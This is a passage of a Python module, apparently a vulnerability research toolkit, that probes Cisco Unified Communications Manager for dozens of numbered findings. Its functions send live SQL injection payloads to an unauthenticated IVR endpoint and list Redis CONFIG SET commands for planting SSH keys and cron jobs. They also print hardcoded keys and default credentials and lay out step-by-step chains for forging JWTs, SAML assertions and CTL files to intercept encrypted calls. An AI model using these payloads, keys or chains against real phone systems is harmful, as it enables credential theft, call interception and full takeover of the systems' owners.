            "len":     len(r.content),
            "content": r.content.hex() if r.status_code == 200 else "",
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F12"}


def check_device_id_strstr_bypass(cert_cn: str, device_id: str) -> dict:
    """
    CUCM-F16: Simulate CheckDeviceIDinX509Certificate behavior.
    Tests whether certCN passes the strstr(certCN, deviceID[:16]) check used in ccm binary.
    Returns exploit assessment without requiring a live CUCM instance.
    """
    truncated_id = device_id[:16]
    passes_strstr = truncated_id in cert_cn
    passes_strcmp = cert_cn == device_id

    return {
        "finding":       "CUCM-F16",
        "cert_cn":       cert_cn,
        "device_id":     device_id,
        "truncated_id":  truncated_id,
        "passes_strstr": passes_strstr,
        "passes_strcmp": passes_strcmp,
        "vulnerable":    passes_strstr and not passes_strcmp,
        "note":          (
            "BYPASS: cert CN contains device ID as substring — strstr passes, strcmp fails"
            if (passes_strstr and not passes_strcmp) else
            "exact match — expected behavior" if passes_strcmp else
            "no match — registration would be rejected"
        ),
    }


def check_platform_api_trust_all_tls(host: str, port: int = 8443) -> dict:
    """
    CUCM-F17: Detect trust-all TrustManager exposure in platform-api SOAP client.
    Probes CertificateCsrAndDataExportService endpoint and checks whether CUCM accepts
    a self-signed cert without validation error — confirming the trust-all TrustManager is active.
    A 200 or SOAP fault (not TLS error) confirms the trust-all pattern.
    """
    import ssl, socket
    target_paths = [
        "/CertificateCsrAndDataExportService",
        "/APIVersionService",
    ]
    results = []
    for path in target_paths:
        url = f"https://{host}:{port}{path}"
        try:
            # Try with a self-signed cert context (what MITM would present)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            r = requests.post(
                url,
                data='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>',
                headers={"Content-Type": "text/xml"},
                verify=False, timeout=10,
            )
            results.append({
                "path":   path,
                "status": r.status_code,
                "note":   "SOAP endpoint reachable — trust-all TrustManager active if CUCM→peer connections use SSLProtocolSocketFactory",
            })
        except Exception as e:
            results.append({"path": path, "error": str(e)})
    return {
        "finding":  "CUCM-F17",
        "host":     host,
        "class":    "com.cisco.vos.platform.api.soapclient.SSLProtocolSocketFactory$1",
        "pattern":  "trust-all X509TrustManager: checkClientTrusted()=return; checkServerTrusted()=return; getAcceptedIssuers()=null",
        "affected": ["CertificateCsrAndDataExportServiceClient", "APIVersionServiceClient"],
        "probes":   results,
        "note":     "Trust-all confirmed statically from bytecode — all outbound HTTPS SOAP from platform-api layer is unvalidated",
    }


def probe_ciscora_est(host: str, port: int = 8084) -> dict:
    """
    CUCM-F23/F24: Probe CiscoRA EST server for Proof of Possession and NTLM auth exposure.
    CiscoRA runs on port 8084 (nginx + custom EST module).
    F23: est_pop off — enrollments accepted without key ownership proof.
    F24: est_certsrv_auth_method NTLM — Windows CA auth susceptible to NTLM relay.
    """
    results = {}
    base = f"https://{host}:{port}"
    # EST standard endpoints (RFC 7030)
    est_paths = [
        "/.well-known/est/cacerts",       # GET — returns CA cert chain (no auth)
        "/.well-known/est/simpleenroll",  # POST — CSR submission endpoint
        "/.well-known/est/csrattrs",      # GET — returns CSR attribute requirements
    ]
    for path in est_paths:
        url = base + path
        try:
            r = requests.get(url, verify=False, timeout=10)
            results[path] = {
                "status":        r.status_code,
                "content_type":  r.headers.get("Content-Type", ""),
                "len":           len(r.content),
                "auth_required": r.status_code in (401, 403),
                "note":          "EST endpoint reachable" if r.status_code != 404 else "not found",
            }
            if r.status_code == 401:
                www_auth = r.headers.get("WWW-Authenticate", "")
                results[path]["www_authenticate"] = www_auth
                results[path]["ntlm_confirmed"] = "NTLM" in www_auth
        except Exception as e:
            results[path] = {"error": str(e)}
    return {
        "finding":        "CUCM-F23+F24",
        "host":           host,
        "port":           port,
        "est_endpoints":  results,
        "config_evidence": {
            "est_pop":               "off",
            "est_certsrv_auth":      "NTLM",
            "hardcoded_ca_server":   "WIN-EJSG9DN4GS6",
        },
        "note": ("F23: est_pop off — submit CSR without private key proof; "
                 "F24: NTLM relay — intercept CiscoRA→WindowsCA NTLM handshake"),
    }


def probe_saml_sp_signing(host: str, port: int = 8443) -> dict:
    """
    CUCM-F27/F28: Fetch SAML SP metadata and check AuthnRequestsSigned and WantAssertionsSigned.
    SP metadata is at /ssosp/saml/SSO/alias/<entity>/metadata or /ssosp/saml/metadata/sp.xml.
    F27: AuthnRequestsSigned=false → AuthnRequests unsigned.
    F28: WantAssertionsSigned=false + metadata not signed.
    """
    import xml.etree.ElementTree as ET
    results = {}
    sp_paths = [
        "/ssosp/saml/metadata/sp.xml",
        "/ssosp/saml/SSO/alias/cucm/metadata",
    ]
    for path in sp_paths:
        url = f"https://{host}:{port}{path}"
        try:
            r = requests.get(url, verify=False, timeout=10)
            results[path] = {"status": r.status_code}
            if r.status_code == 200:
                try:
                    root = ET.fromstring(r.text)
                    ns = {'md': 'urn:oasis:names:tc:SAML:2.0:metadata'}
                    spsso = root.find('.//md:SPSSODescriptor', ns)
                    if spsso is not None:
                        results[path]["AuthnRequestsSigned"] = spsso.get('AuthnRequestsSigned', 'NOT_SET')
                        results[path]["WantAssertionsSigned"] = spsso.get('WantAssertionsSigned', 'NOT_SET')
                        sig = root.find('{http://www.w3.org/2000/09/xmldsig#}Signature')
                        results[path]["metadata_signed"] = sig is not None
                    results[path]["raw_snippet"] = r.text[:500]
                except ET.ParseError as e:
                    results[path]["parse_error"] = str(e)
        except Exception as e:
            results[path] = {"error": str(e)}
    return {
        "finding":    "CUCM-F27+F28",
        "host":       host,
        "port":       port,
        "config_defaults": {
            "metadata_auth_request_signed": "false",
            "metadata_assertion_signed":    "false",
            "sp_md_signed":                 "false",
        },
        "sp_metadata_probes": results,
        "note": ("F27: AuthnRequestsSigned=false → forged AuthnRequests; "
                 "F28: sp_md_signed=false → unsigned SP metadata allows substitution"),
    }


def check_rsa_pkcs1_in_asymencryption(jar_path: str = None) -> dict:
    """
    CUCM-F29: Confirm RSA/ECB/PKCS1PADDING usage in CCMAsymmetricEncryption.class.
    If jar_path provided, attempts to extract and verify the constant pool entry.
    Otherwise returns static bytecode evidence from RE.
    """
    evidence = {
        "class":         "com.cisco.ccm.security.CCMAsymmetricEncryption",
        "jar":           "cm-asymencryption-1.0.0.1-0.x86_64.rpm",
        "constant_pool": {"#9": "RSA/ECB/PKCS1PADDING"},
        "usage": [
            {"method": "rsaAsymPubEnc", "bytecode_offset": 12,  "path": "FIPS (isSecure=true, BCFIPSProvider)"},
            {"method": "rsaAsymPubEnc", "bytecode_offset": 77,  "path": "non-FIPS (SHA1PRNG)"},
        ],
        "anomaly":    "local var 'rsaOAEPEncrypter' (slot 3) stores RSA/ECB/PKCS1PADDING cipher — OAEP migration incomplete",
        "nist_ref":   "NIST SP 800-131A Rev2 (2023): PKCS#1 v1.5 key transport disallowed",
        "cve_class":  "Bleichenbacher adaptive chosen-ciphertext attack (1998)",
        "remediation": "Replace 'RSA/ECB/PKCS1PADDING' with 'RSA/ECB/OAEPWithSHA-256AndMGF1Padding'",
    }
    if jar_path:
        try:
            import subprocess
            result = subprocess.run(
                ["javap", "-verbose", "-classpath", jar_path,
                 "com.cisco.ccm.security.CCMAsymmetricEncryption"],
                capture_output=True, text=True, timeout=30,
            )
            evidence["javap_grep"] = [
                line for line in result.stdout.splitlines()
                if "PKCS1" in line or "OAEP" in line or "rsaOAEP" in line
            ]
        except Exception as e:
            evidence["javap_error"] = str(e)
    return {"finding": "CUCM-F29", "evidence": evidence}


def check_oauth_authzkeys_decryption(jar_path: str = None) -> dict:
    """CUCM-F32: Confirm OAuth signing/encryption keys in authzkeys table use CCMEncryption (F3 static key).

    Static evidence: GetAuthzKeys.decryptKey() bytecode:
      offset 0: new #80 // class com/cisco/ccm/security/CCMEncryption
      offset 7: astore_1
      offset 8: aload_1
      offset 9: aload_0
      offset 10: invokestatic #82 // CCMEncryption.hexToByte(String)[B
      offset 13: invokevirtual #83 // CCMEncryption.decryptPassword([B)String
    tkpurpose=1: symmetric AES key → decryptKey() → base64 decode → TokenKeys.symmetricKey
    tkpurpose=2: RSA signing private key → decryptKey() → readPrivateKey() → TokenKeys.verificationKey
    """
    evidence = {
        "class":  "com.cisco.security.ims.authentication.GetAuthzKeys",
        "method": "decryptKey(String)",
        "sql":    "select keyid, keyvalue, tkpurpose from authzkeys",
        "decrypt_calls": [
            {"offset": 85,  "opcode": "invokestatic",  "target": "decryptKey:(Ljava/lang/String;)Ljava/lang/String;", "context": "tkpurpose=1 symmetric key"},
            {"offset": 191, "opcode": "invokestatic",  "target": "decryptKey:(Ljava/lang/String;)Ljava/lang/String;", "context": "tkpurpose=2 RSA signing key"},
        ],
        "decrypt_impl": [
            "new #80 // com/cisco/ccm/security/CCMEncryption",
            "invokestatic #82 // CCMEncryption.hexToByte(String)[B",
            "invokevirtual #83 // CCMEncryption.decryptPassword([B)String",
        ],
        "key_paths": {
            "signing":    "/usr/local/platform/.security/authz/keys/authz_priv.pem",
            "encryption": "/usr/local/platform/.security/authz/keys/authz_symmetric_Key",
        },
        "chain": "F3 static key → CCMEncryption.decryptPassword(authzkeys.keyvalue) → RSA signing key → forge JWT → BearerAuthenticationRequestHandler accepts → admin access",
    }
    if jar_path:
        try:
            import subprocess
            result = subprocess.run(
                ["javap", "-p", "-c", "-classpath", jar_path,
                 "com.cisco.security.ims.authentication.GetAuthzKeys"],
                capture_output=True, text=True, timeout=30,
            )
            evidence["javap_grep"] = [
                line for line in result.stdout.splitlines()
                if "CCMEncryption" in line or "decryptKey" in line or "authzkeys" in line or "tkpurpose" in line
            ]
        except Exception as e:
            evidence["javap_error"] = str(e)
    return {"finding": "CUCM-F32", "severity": "CRITICAL", "evidence": evidence}


def check_openam_encryption_key(federation_config_path: str = None) -> dict:
    """CUCM-F33: Confirm hardcoded am.encryption.pwd in FederationConfig.properties.

    Static evidence:
      FederationConfig.properties L152: am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2
      FederationConfig.properties L113: passwordDecoder=com.sun.identity.fedlet.FedletEncodeDecode
      Affected: tomcat.keystore SAML signing key + Tomcat HTTPS TLS key
    """
    HARDCODED_KEY = "8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2"
    evidence = {
        "file":           "FederationConfig.properties",
        "path":           "/usr/local/platform/sso/saml/metadata/FederationConfig.properties",
        "hardcoded_key":  HARDCODED_KEY,
        "line":           152,
        "property":       "am.encryption.pwd",
        "decoder_class":  "com.sun.identity.fedlet.FedletEncodeDecode",
        "affected_secrets": [
            {"property": "com.sun.identity.saml.xmlsig.storepass",
             "value_path": "/usr/local/platform/.security/tomcat/keys/tomcat.passphrase",
             "unlocks": "tomcat.keystore JKS (SAML signing key + Tomcat TLS key)"},
            {"property": "com.sun.identity.saml.xmlsig.keypass",
             "value_path": "/usr/local/platform/.security/tomcat/keys/tomcat.passphrase",
             "unlocks": "SAML SP signing private key (alias: tomcat)"},
        ],
        "chain": (
            f"am.encryption.pwd={HARDCODED_KEY!r} → FedletEncodeDecode.decode(tomcat.passphrase) → "
            "JKS password → unlock tomcat.keystore → extract SAML signing key → "
            "forge SAML assertions for any user → admin access"
        ),
    }
    if federation_config_path:
        try:
            with open(federation_config_path) as f:
                for line in f:
                    if "am.encryption.pwd" in line:
                        value = line.split("=", 1)[1].strip()
                        evidence["observed_key"] = value
                        evidence["key_matches"] = (value == HARDCODED_KEY)
        except Exception as e:
            evidence["read_error"] = str(e)
    return {"finding": "CUCM-F33", "severity": "CRITICAL", "evidence": evidence}


def check_f3_credential_estate(db_conn=None) -> dict:
    """CUCM-F34: Verify F3 static key encrypts full credential estate across all subsystems."""
    F3_KEY = "smetsysocsiccni"
    evidence = {
        "finding": "CUCM-F34",
        "severity": "HIGH",
        "f3_key": F3_KEY,
        "credential_stores": [
            {"table": "ldapauthentication", "column": "ldappassword",
             "component": "IMS/AuthenticationLDAP",
             "query": "SELECT ldapdn, ldappassword FROM ldapauthentication",
             "decrypt": "CCMEncryption.hexToByte(ldappassword) → decryptPassword([B)"},
            {"table": "directorypluginconfig", "column": "ldappassword",
             "component": "DirSync/DSLDAPSyncImpl",
             "query": "SELECT ldapdn, ldappassword FROM directorypluginconfig d, directorypluginhost h WHERE d.pkid=h.fkdirectorypluginconfig",
             "decrypt": "CCMEncryption.hexToByte → decryptPassword"},
            {"table": "device", "column": "sshpassword",
             "component": "BPS/PhoneDBManager + RDPDBManager",
             "query": "SELECT name, sshpassword FROM device WHERE sshpassword IS NOT NULL",
             "decrypt": "CCMEncryption.encryptPasswordHex (stored); reverse with decryptPasswordHex"},
            {"table": "authzkeys", "column": "keyvalue",
             "component": "IMS/GetAuthzKeys (see F32)",
             "query": "SELECT keyid, keyvalue, tkpurpose FROM authzkeys",
             "decrypt": "CCMEncryption.hexToByte → decryptPassword"},
        ],
        "chain": (
            "F4 (ccmuser:ccmuser) → SELECT ldappassword FROM ldapauthentication → "
            f"CCMEncryption(key={F3_KEY!r}).decryptPassword → plaintext AD bind credentials; "
            "same key recovers phone SSH passwords from device.sshpassword"
        ),
    }
    if db_conn:
        try:
            cur = db_conn.cursor()
            cur.execute("SELECT COUNT(*) FROM ldapauthentication WHERE ldappassword IS NOT NULL AND ldappassword != ''")
            evidence["ldap_encrypted_count"] = cur.fetchone()[0]
            cur.execute("SELECT COUNT(*) FROM device WHERE sshpassword IS NOT NULL AND sshpassword != ''")
            evidence["phone_ssh_encrypted_count"] = cur.fetchone()[0]
        except Exception as e:
            evidence["db_error"] = str(e)
    return evidence


def check_ctl_chain(host: str = None, port: int = 8443) -> dict:
    """
    CUCM-F35: CTL file forge chain assessment.
    F1 RCE + F30 plaintext passphrase → CTLCli → forged CTLFile.tlv → phone estate MitM.

    Static evidence:
      CTLCli binary: PEM_read_bio_RSAPrivateKey, RSASign, RSASignException
      Files: /usr/local/cm/tftp/CTLFile.tlv, /usr/local/cm/tftp/CTLFile_old.tlv
      updateCTLFile.sh: echo "y" | /usr/local/cm/bin/ctl_cli.sh 3
    """
    evidence = {
        "finding": "CUCM-F35",
        "severity": "CRITICAL",
        "binary": "/usr/local/cm/bin/CTLCli",
        "build_id": "0f961bbada7eb221b24f42b8e603d2eea5373620",
        "functions_confirmed": ["PEM_read_bio_RSAPrivateKey", "RSASign", "RSASignException"],
        "ctl_file_path": "/usr/local/cm/tftp/CTLFile.tlv",
        "passphrase_path": "/usr/local/cm/.security/CallManager/keys/CallManager.passphrase",
        "chain": [
            "F1 Axis2 RCE → arbitrary code execution as Tomcat/CM service user",
            "F30: read /usr/local/cm/.security/CallManager/keys/CallManager.passphrase (plaintext)",
            "PEM_read_bio_RSAPrivateKey(CallManager_priv.pem, passphrase) → CM signing key in memory",
            "Inject attacker X.509 cert with SAST role into CTLFile.tlv payload",
            "Sign CTLFile.tlv with CM private key (RSASign in CTLCli or equivalent OpenSSL call)",
            "Write forged CTL to /usr/local/cm/tftp/CTLFile.tlv (TFTP auto-serves, no auth check)",
            "DoDeviceReset via AXL API → phones reboot → TFTP fetch forged CTLFile.tlv",
            "Phones trust attacker SAST cert → accept attacker as trusted CUCM",
            "MitM all SIP/TLS and SRTP: decrypt voice, intercept signaling, register phantom extensions",
        ],
        "impact": "Full phone estate PKI trust collapse; all encrypted calls decryptable; arbitrary extension registration",
        "cvss": "9.9 Critical AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    }
    if host:
        # Probe: check if CTLFile.tlv is accessible via TFTP or HTTP
        import socket
        try:
            # Check TFTP port open (UDP 69)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            s.sendto(b'\x00\x01CTLFile.tlv\x00octet\x00', (host, 69))
            data, _ = s.recvfrom(1024)
            evidence["tftp_probe"] = {"status": "open", "data_len": len(data),
                                       "note": "TFTP responding — CTLFile.tlv likely accessible"}
        except Exception as e:
            evidence["tftp_probe"] = {"status": "error", "msg": str(e)}
        finally:
            try: s.close()
            except: pass
    return evidence


def check_credential_logging(log_dir: str = None) -> dict:
    """
    CUCM-F36: Detect decrypted credential logging in CUCM trace logs.

    Static evidence from core ccm binary strings:
      SIPSecurity: "decrypt hex password = \"%s\" , ecnrypted len %d"
      SAF profile:  "password............... %s"
      HttpNP:       "userName=%s, password=%s"
    """
    import re
    evidence = {
        "finding": "CUCM-F36",
        "severity": "LOW",
        "log_sites": [
            {"binary": "ccm", "pattern": 'SIPSecurity::decrypt hex password = "%s"',
             "credential": "SIP auth password (decrypted plaintext)", "level": "DEBUG/TRACE"},
            {"binary": "ccm", "pattern": "password............... %s",
             "credential": "SAF forwarder connection password", "level": "DIAGNOSTIC"},
            {"binary": "ccm", "pattern": "userName=%s, password=%s",
             "credential": "HTTP service account credentials", "level": "DEBUG"},
        ],
        "log_path": "/var/log/active/cm/trace/ccm/sdi/",
        "access_role": "Standard CCM Admin Users (RTMT log collection)",
        "impact": "SAF inter-cluster password → lateral movement; SIP device password → rogue registration",
        "cvss": "3.5 Low AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
    }
    if log_dir:
        import os, glob
        password_pattern = re.compile(
            r'(decrypt hex password\s*=\s*"[^"]{4,}"'
            r'|password\.*\s*=\s*\S+)',
            re.IGNORECASE
        )
        hits = []
        for log_file in glob.glob(os.path.join(log_dir, "*.txt")):
            try:
                with open(log_file, errors='replace') as f:
                    for i, line in enumerate(f, 1):
                        if password_pattern.search(line):
                            hits.append({"file": log_file, "line": i,
                                         "content": line.strip()[:120]})
                            if len(hits) >= 20:
                                break
            except Exception:
                pass
        evidence["log_hits"] = hits
        evidence["hit_count"] = len(hits)
    return evidence


def check_ccmivr_sqli(host: str = None, port: int = 8443) -> dict:
    """CUCM-F37: Probe ccmivr IVR endpoint for pre-auth SQL injection via ccmusername.
    Root cause: StringBuilder.append(ccmusername) before prepareStatement() — no parameterization.
    Validator allows single-quote in username; GET/POST unprotected by web.xml constraint."""
    evidence = {
        "finding": "CUCM-F37",
        "severity": "HIGH",
        "cvss": "8.6 High AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
        "war": "/usr/local/cm/war/ccmivr.war",
        "vulnerable_class": "com.cisco.snr.ivr.util.IVRDBInterface",
        "vulnerable_method": "getRemoteDestinationListFromCcmusername",
        "sqli_param": "ccmusername",
        "validator_regex": "^[a-zA-Z0-9$_@.&!*\"'(),%-]+$",
        "validator_flaw": "allows single-quote character — SQL string escape breakout",
        "auth_bypass": "web.xml <http-method-omission>GET/POST — GET and POST requests unrestricted",
        "sql_template": "select rdd.destination from enduser e, ... where e.userid = '<PARAM>' and ...",
        "test_payload": "x' UNION SELECT password FROM enduser WHERE userid='admin",
        "amplifier": "F3 static key decrypts any returned enduser.password values",
        "bytecode_evidence": {
            "offset_55": "ldc #104 — SQL prefix with userid = '",
            "offset_61": "invokevirtual StringBuilder.append(ccmusername) — user input concatenated",
            "offset_155": "invokevirtual Connector.prepareStatement(String, int, int) — no ? placeholders",
            "offset_162": "invokeinterface PreparedStatement.executeQuery() — no setString() calls",
        },
    }
    if host:
        url = f"https://{host}:{port}/ccmivr/ccmivr.do"
        params_benign = {
            "action": "IVRCalleridLookup2",
            "ccmusername": "testuser",
            "pin": "0000",
            "srcdir": "en_US",
            "remotedest": "5551234567",
            "accessCount": "0",
        }
        params_sqli = {
            "action": "IVRCalleridLookup2",
            "ccmusername": "x' OR '1'='1",
            "pin": "0000",
            "srcdir": "en_US",
            "remotedest": "5551234567",
            "accessCount": "0",
        }
        try:
            r_benign = requests.get(url, params=params_benign, verify=False, timeout=10)
            r_sqli = requests.get(url, params=params_sqli, verify=False, timeout=10)
            evidence["probe"] = {
                "benign_status": r_benign.status_code,
                "sqli_status": r_sqli.status_code,
                "benign_len": len(r_benign.text),
                "sqli_len": len(r_sqli.text),
                "response_diff": abs(len(r_sqli.text) - len(r_benign.text)),
                "accessible_unauth": r_benign.status_code in (200, 302, 500),
                "error_difference": r_sqli.text != r_benign.text,
            }
            if r_sqli.status_code == 500 and r_benign.status_code != 500:
                evidence["probe"]["sql_error_triggered"] = True
        except Exception as e:
            evidence["probe"] = {"error": str(e)}
    return evidence


def check_srst_ctl_tls(host: str = None, port: int = 2444) -> dict:
    """CUCM-F39: Verify SRST CTL client EasyX509TrustManager TLS bypass.
    Root cause: CTLSocket.tlsConnect() installs EasyX509TrustManager(null) — checkServerTrusted() no-op.
    Attack: MitM between CUCM and SRST router → inject CTL file → phones trust attacker CA."""
    evidence = {
        "finding": "CUCM-F39",
        "severity": "HIGH",
        "cvss": "7.4 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "jar": "srstctlclient.jar",
        "vulnerable_class": "com.cisco.ccm.security.SRSTCTLClient.EasyX509TrustManager",
        "vulnerable_method": "checkServerTrusted + checkClientTrusted",
        "caller": "CTLSocket.tlsConnect()",
        "tls_bypass": "EasyX509TrustManager.checkServerTrusted(): 0: return (no-op — no exception thrown)",
        "sscontext_init": "SSLContext.init([EasyX509TrustManager(null)], null, null)",
        "protocol": "SRST CTL distribution — CUCM pushes CTLFile to branch SRST routers",
        "default_port": 2444,
        "amplifier": "F35 (CTL trust chain abuse) — this bypass enables remote F35 without physical access",
        "attack_chain": [
            "Attain MitM between CUCM pub/sub and branch SRST router",
            "Present self-signed TLS cert — accepted (checkServerTrusted is no-op)",
            "Inject crafted CTL file with attacker CA",
            "Branch phones import attacker CA into trust store",
            "Intercept SIP TLS / TFTP — full phone estate compromise at that site",
        ],
    }
    if host:
        import ssl, socket
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with socket.create_connection((host, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    evidence["probe"] = {
                        "host": host, "port": port,
                        "tls_open": True,
                        "cert_len": len(cert) if cert else 0,
                        "note": "Port open; CUCM SRST CTL client would accept any cert presented here",
                    }
        except Exception as e:
            evidence["probe"] = {"host": host, "port": port, "error": str(e)}
    return evidence


def check_cmas_redis(host: str = None, port: int = 6379) -> dict:
    """CUCM-F41: Probe CMAS Redis for unauthenticated access.
    Root cause: redis.conf ships with bind=0.0.0.0, protected-mode=no, no requirepass.
    Redis serves as pub/sub for CDRs, CUCM syslogs, Filebeat streams.
    CONFIG SET file-write enables SSH key injection or cron-based RCE."""
    evidence = {
        "finding": "CUCM-F41",
        "severity": "CRITICAL",
        "cvss": "9.8 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "config_file": "/usr/local/cm/conf/redis.conf",
        "vulnerable_settings": {
            "bind": "0.0.0.0",
            "protected-mode": "no",
            "port": 6379,
            "requirepass": "NOT SET",
        },
        "data_exposed": [
            "CDRs via MACDRSubscriber pub/sub channel",
            "CUCM syslog via MACMSyslogSubscriber",
            "Filebeat log stream via MAFilebeatSubscriber",
        ],
        "attack_vectors": [
            "redis-cli -h <host> subscribe <cdr-channel> → real-time CDR exfil",
            "CONFIG SET dir /root/.ssh/ + CONFIG SET dbfilename authorized_keys + SET + BGSAVE → SSH as root",
            "CONFIG SET dir /var/spool/cron/ + CONFIG SET dbfilename root + SET cron job + BGSAVE → RCE",
        ],
    }
    if host:
        import socket
        try:
            with socket.create_connection((host, port), timeout=5) as s:
                s.sendall(b"PING\r\n")
                resp = s.recv(64)
                if resp.startswith(b"+PONG"):
                    s.sendall(b"INFO server\r\n")
                    info = s.recv(2048).decode(errors="replace")
                    redis_ver = next((l.split(":")[1].strip() for l in info.splitlines() if l.startswith("redis_version:")), "unknown")
                    evidence["probe"] = {
                        "host": host, "port": port,
                        "authenticated": False,
                        "pong": True,
                        "redis_version": redis_ver,
                        "status": "VULNERABLE — unauthenticated Redis responds to PING",
                    }
                else:
                    evidence["probe"] = {"host": host, "port": port, "response": resp[:32].hex()}
        except Exception as e:
            evidence["probe"] = {"host": host, "port": port, "error": str(e)}
    return evidence


def check_webdialer_soap(host: str = None, port: int = 8080) -> dict:
    """CUCM-F44: Probe WebDialer Axis SOAP endpoint for unauthenticated access."""
    evidence = {
        "finding": "CUCM-F44",
        "severity": "CRITICAL",
        "title": "WebDialer /services/* accessible without container auth; adminPassword=admin",
    }
    if host:
        import urllib.request
        # Probe /services/WebdialerSoapService70 — should return Axis WSDL without auth
        url = f"http://{host}:{port}/webdialer/services/WebdialerSoapService70?wsdl"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(512).decode("utf-8", errors="replace")
                if "wsdl" in body.lower() or "WebdialerSoap" in body or "WD70" in body:
                    evidence["probe"] = {
                        "host": host, "port": port, "status": r.status,
                        "verdict": "UNAUTHENTICATED_SOAP_WSDL",
                        "snippet": body[:200],
                    }
                else:
                    evidence["probe"] = {"host": host, "port": port, "status": r.status, "body_snippet": body[:100]}
        except Exception as e:
            evidence["probe"] = {"host": host, "port": port, "error": str(e)}
    return evidence


def check_em_service(host: str = None, port: int = 8080) -> dict:
    """CUCM-F45: Probe Extension Mobility EMServiceServlet for unauthenticated GET access."""
    evidence = {
        "finding": "CUCM-F45",
        "severity": "CRITICAL",
        "title": "EMServiceServlet HTTP method bypass — GET/POST unauthenticated (Servlet 2.2 omission)",
    }
    if host:
        import urllib.request
        url = f"http://{host}:{port}/emservice/EMServiceServlet"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(512).decode("utf-8", errors="replace")
                evidence["probe"] = {
                    "host": host, "port": port, "status": r.status,
                    "verdict": "EM_SERVICE_ACCESSIBLE" if r.status < 400 else "BLOCKED",
                    "snippet": body[:200],
                }
        except urllib.error.HTTPError as e:
            evidence["probe"] = {"host": host, "port": port, "http_status": e.code, "verdict": "BLOCKED" if e.code in (401, 403) else "CHECK_RESPONSE"}
        except Exception as e:
            evidence["probe"] = {"host": host, "port": port, "error": str(e)}
    return evidence


def check_dna_alias_lookup(host: str = None, port: int = 8080) -> dict:
    """CUCM-F46: Probe dnaliaslookup UserLookupServlet for unauthenticated access."""
    evidence = {
        "finding": "CUCM-F46",
        "severity": "MEDIUM",
        "title": "dnaliaslookup.war missing auth-constraint — UserLookupServlet + cache ops unauthenticated",
    }
    if host:
        import urllib.request
        url = f"http://{host}:{port}/dnaliaslookup/"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(512).decode("utf-8", errors="replace")
                evidence["probe"] = {
                    "host": host, "port": port, "status": r.status,
                    "verdict": "UNAUTH_LOOKUP_ACCESSIBLE" if r.status < 400 else "BLOCKED",
                    "snippet": body[:200],
                }
        except urllib.error.HTTPError as e:
            evidence["probe"] = {"host": host, "port": port, "http_status": e.code, "verdict": "BLOCKED" if e.code in (401, 403) else "CHECK_RESPONSE"}
        except Exception as e:
            evidence["probe"] = {"host": host, "port": port, "error": str(e)}
    return evidence


def check_ipma_service(host: str = None, port: int = 8080) -> dict:
    """CUCM-F48: Probe IPMA ma.war MAService for unauthenticated GET access."""
    evidence = {
        "finding": "CUCM-F48",
        "severity": "HIGH",
        "title": "IPMA ma.war GET/POST unconstrained — call divert unauthenticated (Servlet 2.2 method omission CSCsx40175)",
    }
    if host:
        import urllib.request
        url = f"http://{host}:{port}/ma/servlet/MAService"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(512).decode("utf-8", errors="replace")
                evidence["probe"] = {
                    "host": host, "port": port, "status": r.status,
                    "verdict": "IPMA_SERVICE_ACCESSIBLE" if r.status < 400 else "BLOCKED",
                    "snippet": body[:200],
                }
        except urllib.error.HTTPError as e:
            evidence["probe"] = {"host": host, "port": port, "http_status": e.code, "verdict": "BLOCKED" if e.code in (401, 403) else "CHECK_RESPONSE"}
        except Exception as e:
            evidence["probe"] = {"host": host, "port": port, "error": str(e)}
    return evidence


def check_dna_main_servlet(host: str = None, port: int = 8080) -> dict:
    """CUCM-F47: Probe dna.war DNAMainServlet for unauthenticated access."""
    evidence = {
        "finding": "CUCM-F47",
        "severity": "MEDIUM",
        "title": "dna.war DNAMainServlet no security-constraint + missing TokenFilter → unauthenticated alias writes",
    }
    if host:
        import urllib.request
        url = f"http://{host}:{port}/dna/DNAMainServlet"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(512).decode("utf-8", errors="replace")
                evidence["probe"] = {
                    "host": host, "port": port, "status": r.status,
                    "verdict": "DNA_MAIN_ACCESSIBLE" if r.status < 400 else "BLOCKED",
                    "snippet": body[:200],
                }
        except urllib.error.HTTPError as e:
            evidence["probe"] = {"host": host, "port": port, "http_status": e.code, "verdict": "BLOCKED" if e.code in (401, 403) else "CHECK_RESPONSE"}
        except Exception as e:
            evidence["probe"] = {"host": host, "port": port, "error": str(e)}
    return evidence


def full_findings_summary() -> str:
    """Return a printable summary of all CUCM RE findings."""
    findings = [
        ("CUCM-F1",  "CRITICAL", "Axis2 admin:axis2 hardcoded + web.xml confirms no filter on /axis2-admin/* → RCE"),
        ("CUCM-F2",  "HIGH",     "platformcom BasicAuthentication localhost bypass"),
        ("CUCM-F3",  "CRITICAL", "Hardcoded AES-128 static key 'smetsysocsiccni' → decrypt ALL CUCM credentials"),
        ("CUCM-F4",  "HIGH",     "ccmuser:ccmuser hardcoded Informix DB credential"),
        ("CUCM-F5",  "CRITICAL", "Default passwordreverse = AES-CBC(statickey,'') → SIP auth bypass (all default users)"),
